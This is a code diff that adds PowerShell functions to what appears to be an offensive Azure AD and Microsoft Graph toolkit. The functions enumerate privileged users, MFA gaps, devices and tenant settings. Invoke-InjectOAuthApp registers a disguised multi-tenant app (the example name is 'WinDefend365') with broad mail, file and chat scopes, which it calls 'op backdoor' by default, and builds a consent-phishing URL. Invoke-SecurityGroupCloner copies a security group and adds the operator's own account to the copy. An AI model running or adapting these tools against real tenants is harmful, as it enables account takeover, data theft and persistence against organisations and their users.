@@ -2027,3 +2027,628 @@ function Invoke-GraphEnum {
 
     Write-Host -ForegroundColor Green "[*] Enumeration completed. Results saved in $folderName"
 }
+
+
+function Get-PrivilegedUsers {
+    <#
+    .SYNOPSIS
+        Enumerates users with privileged roles in Azure AD.
+
+    .DESCRIPTION
+        Retrieves all role assignments in Azure AD and maps them to their assigned users, groups, or service principals.
+
+    .EXAMPLE
+        Get-PrivilegedUsers
+    #>
+
+    # Ensure connection to Microsoft Graph
+    if (-not (Get-MgContext)) {
+        Connect-MgGraph -Scopes "RoleManagement.Read.Directory", "User.Read.All", "Group.Read.All", "Application.Read.All"
+    }
+
+    Write-Host "[*] Retrieving Azure AD Role Assignments..." -ForegroundColor Cyan
+
+    # Fetch all role assignments
+    try {
+        $roleAssignments = Get-MgRoleManagementDirectoryRoleAssignment -All
+    } catch {
+        Write-Host "[-] Failed to retrieve role assignments: $($_.Exception.Message)" -ForegroundColor Red
+        return
+    }
+
+    if (-not $roleAssignments) {
+        Write-Host "[!] No privileged role assignments found." -ForegroundColor Yellow
+        return
+    }
+
+    # Fetch all role definitions once to avoid repeated API calls
+    try {
+        $roleDefinitions = Get-MgRoleManagementDirectoryRoleDefinition -All
+        $roleLookup = @{}
+        foreach ($role in $roleDefinitions) {
+            $roleLookup[$role.Id] = $role.DisplayName
+        }
+    } catch {
+        Write-Host "[-] Failed to retrieve role definitions: $($_.Exception.Message)" -ForegroundColor Red
+        return
+    }
+
+    $results = @()
+
+    foreach ($assignment in $roleAssignments) {
+        $principal = $null
+        $roleName = $roleLookup[$assignment.RoleDefinitionId]
+
+		if (-not $roleLookup[$assignment.RoleDefinitionId]) {
+		    Write-Host "[!] Skipping missing role for assignment $($assignment.Id): RoleDefinitionId $($assignment.RoleDefinitionId) not found in definitions." -ForegroundColor Yellow
+		    Write-Host "    -> Possible reasons: Role does not exist, was deleted, or API failed to retrieve it."
+		    continue
+		}
+
+        # Attempt to resolve the principal (User, Group, or Service Principal)
+        try {
+            $principal = Get-MgUser -UserId $assignment.PrincipalId -ErrorAction Stop
+            $principalType = "User"
+        } catch {
+            try {
+                $principal = Get-MgGroup -GroupId $assignment.PrincipalId -ErrorAction Stop
+                $principalType = "Group"
+            } catch {
+                try {
+                    $principal = Get-MgServicePrincipal -ServicePrincipalId $assignment.PrincipalId -ErrorAction Stop
+                    $principalType = "ServicePrincipal"
+                } catch {
+                    Write-Host "[!] Skipping unresolved PrincipalId $($assignment.PrincipalId) for assignment $($assignment.Id)" -ForegroundColor Cyan
+                    continue
+                }
+            }
+        }
+
+        if ($principal) {
+            $results += [PSCustomObject]@{
+                "PrincipalName" = $principal.DisplayName
+                "PrincipalType" = $principalType
+                "PrincipalId"   = $principal.Id
+                "RoleName"      = $roleName
+                "RoleId"        = $assignment.RoleDefinitionId
+                "AssignmentId"  = $assignment.Id
+            }
+
+            Write-Host "[+] $($principal.DisplayName) ($principalType) - Role: $roleName" -ForegroundColor Green
+        }
+    }
+
+    Write-Host "n[*] Completed enumeration of privileged users."
+    return $results
+}
+
+function Get-MFAStatus {
+    <#
+    .SYNOPSIS
+        Retrieves MFA status for all users in Azure AD.
+
+    .DESCRIPTION
+        Lists users and checks if they have MFA authentication methods configured.
+
+    .EXAMPLE
+        Get-MFAStatus
+    #>
+
+    # Ensure connection to Microsoft Graph
+    if (-not (Get-MgContext)) {
+        Connect-MgGraph -Scopes "User.Read.All", "UserAuthenticationMethod.Read.All"
+    }
+
+    Write-Host "[*] Fetching users from Azure AD..." -ForegroundColor Yellow
+    try {
+        $users = Get-MgUser -All -Property "Id,DisplayName,UserPrincipalName"
+    } catch {
+        Write-Host "[-] Failed to retrieve users: $($_.Exception.Message)" -ForegroundColor Red
+        return
+    }
+
+    if (-not $users) {
+        Write-Host "[!] No users found in the tenant." -ForegroundColor Yellow
+        return
+    }
+
+    $results = @()
+
+    foreach ($user in $users) {
+        try {
+            $authMethods = Get-MgUserAuthenticationMethod -UserId $user.Id -ErrorAction Stop
+            $mfaEnabled = $authMethods | Where-Object { $_.'@odata.type' -match "microsoft.graph.(phoneAuthenticationMethod|fido2AuthenticationMethod|microsoftAuthenticatorAuthenticationMethod)" }
+
+            $status = if ($mfaEnabled) { "Enabled" } else { "Disabled" }
+
+            $results += [PSCustomObject]@{
+                "User"        = $user.DisplayName
+                "UserPrincipalName" = $user.UserPrincipalName
+                "UserId"      = $user.Id
+                "MFA Status"  = $status
+            }
+
+            Write-Host "[+] $($user.DisplayName) ($($user.UserPrincipalName)) - MFA: $status" -ForegroundColor (if ($mfaEnabled) { "Green" } else { "Red" })
+        } catch {
+            if ($_.Exception.Message -match "accessDenied") {
+                Write-Host "[-] Insufficient permissions to check MFA status for $($user.UserPrincipalName)" -ForegroundColor Red
+            } else {
+                Write-Host "[-] Error retrieving MFA status for $($user.UserPrincipalName): $($_.Exception.Message)" -ForegroundColor Red
+            }
+        }
+    }
+
+    Write-Host "`n[*] MFA Status Check Completed."
+    return $results
+}
+
+
+function Get-Devices {
+    <#
+    .SYNOPSIS
+        Retrieves all registered devices in Azure AD, including assigned users (if available), and exports them to a CSV.
+
+    .DESCRIPTION
+        Queries all Azure AD-registered devices, showing a live counter while processing, 
+        and exports them to a CSV file with detailed device information.
+
+    .EXAMPLE
+        Get-Devices
+    #>
+
+    $csvFile = "devices.csv"
+    $count = 0
+    $deviceList = @()
+
+    Write-Host "[*] Retrieving registered devices from Azure AD..." -ForegroundColor Cyan
+
+    try {
+        $devices = Get-MgDevice -All
+    } catch {
+        Write-Host "`n[-] Failed to retrieve devices: $($_.Exception.Message)" -ForegroundColor Red
+        return
+    }
+
+    if (-not $devices) {
+        Write-Host "`n[!] No registered devices found." -ForegroundColor Yellow
+        return
+    }
+
+    foreach ($device in $devices) {
+        $owners = ""
+
+        # Fetch device owners (if available)
+        try {
+            $ownersList = Get-MgDeviceRegisteredOwner -DeviceId $device.Id -ErrorAction Stop
+            if ($ownersList) {
+                # Filter only User objects and get DisplayName
+                $userOwners = $ownersList | Where-Object { $_.AdditionalProperties.displayName } | Select-Object -ExpandProperty AdditionalProperties
+                if ($userOwners) {
+                    $owners = ($userOwners.displayName) -join ", "
+                } else {
+                    $owners = "No user owner"
+                }
+            }
+        } catch {
+            $owners = "Unknown"
+        }
+
+        $deviceList += [PSCustomObject]@{
+            "DeviceName"  = $device.DisplayName
+            "DeviceID"    = $device.Id
+            "OS"          = $device.OperatingSystem
+            "OSVersion"   = $device.OperatingSystemVersion
+            "Compliant"   = $device.IsCompliant
+            "Managed"     = $device.IsManaged
+            "TrustType"   = $device.TrustType
+            "JoinType"    = $device.DeviceTrustType
+            "Owner"       = $owners
+        }
+
+        $count++
+        Write-Host "`r[*] Devices enumerated: $count" -NoNewline
+    }
+
+    $deviceList | Export-Csv -Path $csvFile -NoTypeInformation
+
+    Write-Host "`r[+] $count devices found, exported to devices.csv" -ForegroundColor Green
+}
+
+function Get-TenantEnumeration {
+    <#
+    .SYNOPSIS
+        Enumerates Azure AD tenancy details.
+
+    .DESCRIPTION
+        Retrieves tenant ID, verified domains, federation settings, external collaboration settings, 
+        security defaults, and license information.
+
+    .EXAMPLE
+        Get-TenantEnumeration
+    #>
+
+    Write-Host "[*] Retrieving Azure AD Tenancy Information..." -ForegroundColor Yellow
+
+    # Ensure connection to Microsoft Graph
+    if (-not (Get-MgContext)) {
+        Connect-MgGraph -Scopes "Directory.Read.All", "Domain.Read.All", "Policy.Read.All", "User.Read.All", "Application.Read.All"
+    }
+
+    # Fetch basic tenant details
+    try {
+        $tenant = Get-MgOrganization
+        Write-Host "`n[*] Tenant Information:" -ForegroundColor Cyan
+        Write-Host "[+] Tenant Name: $($tenant.DisplayName)"
+        Write-Host "[+] Tenant ID: $($tenant.Id)"
+        Write-Host "[+] Default Domain: $($tenant.VerifiedDomains | Where-Object { $_.IsDefault -eq $true } | Select-Object -ExpandProperty Name)"
+    } catch {
+        Write-Host "[-] Failed to retrieve tenant details: $($_.Exception.Message)" -ForegroundColor Red
+    }
+
+    # Fetch verified domains
+    try {
+        $domains = Get-MgDomain
+        Write-Host "`n[*] Listing Verified Domains:" -ForegroundColor Cyan
+        foreach ($domain in $domains) {
+            $isFederated = if ($null -ne $domain.AuthenticationType -and $domain.AuthenticationType -eq "Federated") { $true } else { $false }
+            Write-Host "[+] $($domain.Id) (Federation Enabled: $isFederated)"
+        }
+    } catch {
+        Write-Host "[-] Failed to retrieve domains: $($_.Exception.Message)" -ForegroundColor Red
+    }
+
+    # Fetch federation settings for federated domains only
+    Write-Host "`n[*] Checking Federation Configuration..." -ForegroundColor Cyan
+    foreach ($domain in $domains) {
+        $isFederated = if ($null -ne $domain.AuthenticationType -and $domain.AuthenticationType -eq "Federated") { $true } else { $false }
+        
+        if ($isFederated) {
+            try {
+                $federationSettings = Get-MgDomainFederationConfiguration -DomainId $domain.Id -ErrorAction Stop
+                if ($federationSettings) {
+                    Write-Host "[+] Federated Domain: $($domain.Id)"
+                    Write-Host "    [-] Issuer URI: $($federationSettings.IssuerUri)"
+                    Write-Host "    [-] Federation Brand Name: $($federationSettings.DisplayName)"
+                }
+            } catch {
+                Write-Host "[!] Failed to retrieve federation settings for $($domain.Id): $($_.Exception.Message)" -ForegroundColor Cyan
+            }
+        }
+    }
+
+    # Fetch external collaboration settings
+    try {
+        $externalSettings = Get-MgPolicyAuthorizationPolicy
+        Write-Host "`n[*] External Collaboration Settings:" -ForegroundColor Cyan
+        Write-Host "[+] B2B Guest Access Allowed From: $($externalSettings.AllowInvitesFrom)"
+        Write-Host "[+] Guest Users Can Read Directory: $($externalSettings.AllowedToReadOtherUsers)"
+    } catch {
+        Write-Host "[-] Failed to retrieve external collaboration settings: $($_.Exception.Message)" -ForegroundColor Red
+    }
+
+    # Fetch security defaults (handle missing output properly)
+    try {
+        $securityDefaults = Get-MgPolicyIdentitySecurityDefaultEnforcementPolicy -ErrorAction Stop
+        if ($null -ne $securityDefaults -and $securityDefaults.PSObject.Properties.Name -contains "IsEnabled") {
+            Write-Host "`n[*] Security Defaults:" -ForegroundColor Cyan
+            Write-Host "[+] Enabled: $($securityDefaults.IsEnabled)"
+        } else {
+            Write-Host "[!] Security Defaults setting not found." -ForegroundColor Cyan
+        }
+    } catch {
+        Write-Host "[-] Failed to retrieve security defaults: $($_.Exception.Message)" -ForegroundColor Red
+    }
+
+    # Fetch assigned licenses
+    try {
+        $licenses = Get-MgSubscribedSku
+        Write-Host "`n[*] Listing Assigned Licenses:" -ForegroundColor Cyan
+        foreach ($license in $licenses) {
+            Write-Host "[+] SKU: $($license.SkuPartNumber) (Enabled Units: $($license.PrepaidUnits.Enabled))"
+        }
+    } catch {
+        Write-Host "[-] Failed to retrieve licenses: $($_.Exception.Message)" -ForegroundColor Red
+    }
+
+    Write-Host "`n[*] Completed Azure AD Tenancy Enumeration." -ForegroundColor Green
+}
+
+
+function Invoke-InjectOAuthApp {
+    <#
+    .SYNOPSIS
+        Automates the deployment of an App Registration in an Azure AD tenant.
+
+    .DESCRIPTION
+        Creates an App Registration, assigns OAuth permissions, and generates a consent URL.
+        This is useful when portal access is restricted, but users can still register apps.
+
+    .PARAMETER AppName
+        The display name of the App Registration. 
+
+    .PARAMETER ReplyUrl
+        The redirect URL where the OAuth token will be sent.
+
+    .PARAMETER Scope
+        Comma-separated Microsoft Graph permissions (e.g., "Mail.Read","User.Read").
+        If no scope is provided, it defaults to "op backdoor".
+
+    .PARAMETER Tokens
+        (Optional) Pre-authenticated access tokens to use instead of interactive login.
+    
+    .EXAMPLE
+        Invoke-InjectOAuthApp -AppName "WinDefend365" -ReplyUrl "https://windefend.example.com"
+    #>
+
+    Param(
+        [Parameter(Position = 0, Mandatory = $True)]
+        [string]$AppName,
+
+        [Parameter(Position = 1, Mandatory = $True)]
+        [string]$ReplyUrl,
+
+        [Parameter(Position = 2, Mandatory = $False)]
+        [string[]]$Scope,
+
+        [Parameter(Position = 3, Mandatory = $False)]
+        [object[]]$Tokens
+    )
+
+    # Define default scope groups
+    $defaultScopes = @(
+        "openid","profile","offline_access","email",
+        "User.Read","User.ReadBasic.All",
+        "Mail.Read","Mail.Send","Mail.Read.Shared","Mail.Send.Shared",
+        "Files.ReadWrite.All","EWS.AccessAsUser.All",
+        "ChatMessage.Read","ChatMessage.Send","Chat.ReadWrite","Chat.Create",
+        "ChannelMessage.Edit","ChannelMessage.Send","Channel.ReadBasic.All",
+        "Presence.Read.All","Team.ReadBasic.All","Team.Create",
+        "Sites.Manage.All","Sites.Read.All","Sites.ReadWrite.All",
+        "Policy.Read.ConditionalAccess"
+    )
+
+    # Default to "op backdoor" permissions if no scope is provided
+    if (-not $Scope) {
+        Write-Host "[>] No scope provided. Defaulting to 'op backdoor' permissions." -ForegroundColor Cyan
+        $Scope = $defaultScopes
+    }
+
+    # Authentication
+    if ($Tokens) {
+        Write-Host "[>] Using provided access tokens." -ForegroundColor Yellow
+    } else {
+        Write-Host "[>] Authenticating with Microsoft Graph..." -ForegroundColor Cyan
+        Connect-MgGraph -Scopes "Application.ReadWrite.All", "Directory.Read.All", "User.Read" -ErrorAction Stop
+    }
+
+    # Get Microsoft Graph Service Principal
+    Write-Host "[>] Retrieving Microsoft Graph Service Principal ID..." -ForegroundColor Cyan
+    $graphSP = Get-MgServicePrincipal -Filter "displayName eq 'Microsoft Graph'"
+    if (-not $graphSP) {
+        Write-Host "[!] Failed to retrieve Microsoft Graph Service Principal." -ForegroundColor Red
+        return
+    }
+
+    # Resolve scope permissions
+    Write-Host "[>] Resolving permission scope IDs..." -ForegroundColor Cyan
+    $permissionIds = @()
+    foreach ($perm in $Scope) {
+        $permObj = $graphSP.Oauth2PermissionScopes | Where-Object { $_.Value -eq $perm }
+        if ($permObj) {
+            $permissionIds += @{ Id = $permObj.Id; Type = "Scope" }
+        } else {
+            Write-Host "[!] Could not find permission: $perm" -ForegroundColor Red
+        }
+    }
+
+    if (-not $permissionIds) {
+        Write-Host "[!] No valid permissions found. Aborting." -ForegroundColor Red
+        return
+    }
+
+    # Create App Registration
+    Write-Host "[>] Creating App Registration: $AppName..." -ForegroundColor Cyan
+    $app = New-MgApplication -DisplayName $AppName -SignInAudience "AzureADMultipleOrgs" -Web @{ RedirectUris = @($ReplyUrl) }
+
+    if (-not $app) {
+        Write-Host "[!] Failed to create App Registration." -ForegroundColor Red
+        return
+    }
+
+    Write-Host "[+] App Registration created successfully: $($app.DisplayName) (App ID: $($app.AppId))" -ForegroundColor Green
+
+    # Create Service Principal
+    Write-Host "[>] Creating Service Principal..." -ForegroundColor Cyan
+    $sp = New-MgServicePrincipal -AppId $app.AppId
+
+    if (-not $sp) {
+        Write-Host "[!] Failed to create Service Principal." -ForegroundColor Red
+        return
+    }
+
+    Write-Host "[+] Service Principal created: $($sp.DisplayName)" -ForegroundColor Green
+
+    # Assign permissions
+    Write-Host "[>] Assigning OAuth permissions to the App..." -ForegroundColor Cyan
+    Update-MgApplication -ApplicationId $app.Id -RequiredResourceAccess @(@{ ResourceAppId = $graphSP.AppId; ResourceAccess = $permissionIds })
+
+    Write-Host "[+] Permissions assigned successfully." -ForegroundColor Green
+
+    # Generate Client Secret
+    Write-Host "[>] Generating Client Secret..." -ForegroundColor Cyan
+    $secret = Add-MgApplicationPassword -ApplicationId $app.Id -PasswordCredential @{
+        DisplayName  = "DefaultSecret"
+        StartDateTime = (Get-Date)
+        EndDateTime   = (Get-Date).AddYears(1)
+    }
+
+    if (-not $secret) {
+        Write-Host "[!] Failed to generate Client Secret." -ForegroundColor Red
+        return
+    }
+
+    Write-Host "[+] Client Secret generated successfully." -ForegroundColor Green
+
+    # Construct Consent URL
+    Write-Host "[>] Generating OAuth Consent URL..." -ForegroundColor Cyan
+    $scopeParam = ($Scope -join "%20")
+    $consentURL = "https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?client_id=$($app.AppId)&response_type=code&redirect_uri=$([System.Web.HttpUtility]::UrlEncode($ReplyUrl))&response_mode=query&scope=$scopeParam&state=1234"
+
+    Write-Host "`n[+] Deployment Complete! Here are the details:" -ForegroundColor Green
+    Write-Host "--------------------------------------------------------"
+    Write-Host "Application ID: $($app.AppId)" -ForegroundColor Green
+    Write-Host "Object ID: $($app.Id)" -ForegroundColor Green
+    Write-Host "Client Secret: $($secret.SecretText)" -ForegroundColor Green
+    Write-Host "OAuth Consent URL: " -ForegroundColor Cyan
+    Write-Host "$consentURL"
+    Write-Host "--------------------------------------------------------"
+
+    # Provide additional command hints for automatic OAuth flow
+    if ($ReplyUrl -match "localhost" -or $ReplyUrl -match "127.0.0.1") {
+        Write-Host "[>] Localhost detected in Reply URL. You can automate OAuth flow using:" -ForegroundColor Cyan
+        Write-Host ('Invoke-AutoOAuthFlow -ClientId "' + $app.AppId + '" -ClientSecret "' + $secret.SecretText + '" -RedirectUri "' + $ReplyUrl + '" -scope "' + ($Scope -join ' ') + '"') -ForegroundColor Cyan
+    } else {
+        Write-Host "[>] Use the following command to complete the OAuth flow manually:" -ForegroundColor Cyan
+        Write-Host ('Get-AzureAppTokens -ClientId "' + $app.AppId + '" -ClientSecret "' + $secret.SecretText + '" -RedirectUri "' + $ReplyUrl + '" -scope "' + ($Scope -join ' ') + '" -AuthCode <insert your OAuth Code here>') -ForegroundColor Cyan
+    }
+}
+
+
+function Invoke-SecurityGroupCloner {
+    <#
+    .SYNOPSIS
+        Clones a security group in Azure AD, with an option to add your user to the cloned group.
+
+    .DESCRIPTION
+        This function allows you to select a security group from Azure AD, clone its members, and optionally add your user.
+        The function assumes you are already authenticated with `Connect-Graph`.
+
+    .EXAMPLE
+        Invoke-SecurityGroupCloner
+
+    #>
+
+    # Ensure connection to Microsoft Graph
+    if (-not (Get-MgContext)) {
+        Write-Host -ForegroundColor Yellow "[*] Connecting to Microsoft Graph..."
+        Connect-Graph
+    }
+
+    Write-Host -ForegroundColor Cyan "[*] Fetching security groups..."
+    
+    # **FAST SECURITY GROUP RETRIEVAL** (Only gets security groups)
+    $groups = Get-MgGroup -Filter "securityEnabled eq true" -All | Select-Object DisplayName, Id
+
+    if (-not $groups) {
+        Write-Host -ForegroundColor Red "[!] No security groups found."
+        return
+    }
+
+    # Display groups for user selection
+    $groups | ForEach-Object { Write-Host -ForegroundColor Cyan "[>] $($_.DisplayName)" }
+
+    # Prompt user for a group to clone
+    $CloneGroup = ""
+    while ($CloneGroup -eq "") {
+        Write-Host -ForegroundColor Cyan "[*] Enter the name of the security group you want to clone:"
+        $CloneGroup = Read-Host
+
+        if (-not ($groups.DisplayName -contains $CloneGroup)) {
+            Write-Host -ForegroundColor Red "[!] Invalid group. Try again."
+            $CloneGroup = ""
+        }
+    }
+
+    # Retrieve the selected group
+    $selectedGroup = $groups | Where-Object { $_.DisplayName -eq $CloneGroup }
+    $selectedGroupId = $selectedGroup.Id
+    Write-Host -ForegroundColor Yellow "[*] Cloning group: $CloneGroup ($selectedGroupId)..."
+
+    # Retrieve the group members
+    Write-Host -ForegroundColor Cyan "[*] Fetching members of the group..."
+    $members = Get-MgGroupMember -GroupId $selectedGroupId -All
+
+    $memberIds = @()
+    foreach ($member in $members) {
+        if ($member.'@odata.type' -eq "#microsoft.graph.user") {
+            $memberIds += $member.Id
+        }
+    }
+
+    # Prompt user to add themselves to the cloned group
+    Write-Host -ForegroundColor Cyan "[*] Do you want to add your current user to the cloned group? (Yes/No)"
+    $answer = Read-Host
+    if ($answer -match "^(yes|y)$") {
+        $currentUser = Get-MgUser -UserId (Get-MgContext).Account
+        $memberIds += $currentUser.Id
+        Write-Host -ForegroundColor Yellow "[*] Adding your account ($($currentUser.UserPrincipalName)) to the cloned group."
+    }
+
+    # Prompt user to add another user
+    Write-Host -ForegroundColor Cyan "[*] Do you want to add another user to the cloned group? (Yes/No)"
+    $anotherUser = Read-Host
+    if ($anotherUser -match "^(yes|y)$") {
+        Write-Host -ForegroundColor Cyan "[*] Enter the email address of the user to add:"
+        $userEmail = Read-Host
+
+        try {
+            $additionalUser = Get-MgUser -Filter "mail eq '$userEmail'"
+            if ($additionalUser) {
+                $memberIds += $additionalUser.Id
+                Write-Host -ForegroundColor Yellow "[*] Adding $userEmail to the cloned group."
+            } else {
+                Write-Host -ForegroundColor Red "[!] User not found."
+            }
+        } catch {
+            Write-Host -ForegroundColor Red "[!] Error fetching user."
+        }
+    }
+
+    # Prompt user to rename the cloned group
+    Write-Host -ForegroundColor Cyan "[*] Do you want to change the cloned group name? (Yes/No)"
+    $renameGroup = Read-Host
+    if ($renameGroup -match "^(yes|y)$") {
+        Write-Host -ForegroundColor Cyan "[*] Enter the new name for the cloned group:"
+        $CloneGroup = Read-Host
+    }
+
+    # New Security Group Creation
+    Write-Host -ForegroundColor Yellow "[*] Creating new security group: $CloneGroup..."
+    $newGroup = $null
+
+    try {
+        # Suppress Graph API errors by redirecting error output to $null
+        $newGroup = New-MgGroup -BodyParameter @{
+            DisplayName = $CloneGroup
+            MailEnabled = $false
+            SecurityEnabled = $true
+            MailNickname = ($CloneGroup -replace " ", "")
+        } 2>$null  # Redirects errors to $null (suppress output)
+
+        # **Check if the group was actually created**
+        if ($newGroup -and $newGroup.Id) {
+            Write-Host -ForegroundColor Green "[+] Successfully created group: $CloneGroup ($($newGroup.Id))"
+        } else {
+            Write-Host -ForegroundColor Red "[!] Failed to create the group: Insufficient privileges."
+            return  # **Exit immediately if creation failed**
+        }
+    } catch {
+        Write-Host -ForegroundColor Red "[!] Failed to create the group: Insufficient privileges."
+        return  # **Exit immediately**
+    }
+
+    # **Ensure group was created before adding members**
+    if ($newGroup -and $newGroup.Id) {
+        foreach ($memberId in $memberIds | Select-Object -Unique) {
+            try {
+                New-MgGroupMember -GroupId $newGroup.Id -DirectoryObjectId $memberId
+                Write-Host -ForegroundColor Green "[+] Added member: $($memberId)"
+            } catch {
+                Write-Host -ForegroundColor Red "[!] Failed to add member $($memberId)."
+            }
+        }
+    }
+
+    Write-Host -ForegroundColor Green "[*] Security group cloning completed."
+}
+
